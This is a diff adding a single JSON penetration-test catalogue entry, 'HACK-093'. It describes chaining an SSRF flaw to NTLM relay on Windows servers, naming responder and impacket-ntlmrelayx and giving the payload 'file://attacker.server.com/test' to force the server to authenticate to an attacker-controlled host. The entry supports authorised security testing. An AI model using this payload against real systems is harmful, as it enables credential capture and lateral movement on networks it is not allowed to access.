@@ -1,0 +1,10 @@
+{
+    "key": "HACK-093",
+    "summary": "Chaining SSRF to NTLM Relay",
+    "description": "In a Windows environment, use an SSRF vulnerability to force the server to authenticate to an attacker-controlled machine via NTLM, capturing or relaying the hash.",
+    "category": "Chained Exploit",
+    "severity": "Critical",
+    "testing_type": "Penetration Test",
+    "target": "Windows servers on an internal network",
+    "instructions": "1. Pre-requisite: An SSRF vulnerability.\n2. Set up an NTLM relay tool (like `responder` or `impacket-ntlmrelayx`) on a server you control.\n3. Use the SSRF vulnerability to make the target server request a resource from your attacker machine via the `file://` protocol: `file://attacker.server.com/test`.\n4. This will cause the Windows server to attempt NTLM authentication. Your tool will capture or relay this authentication, potentially giving you access to other machines as the server's user."
+}
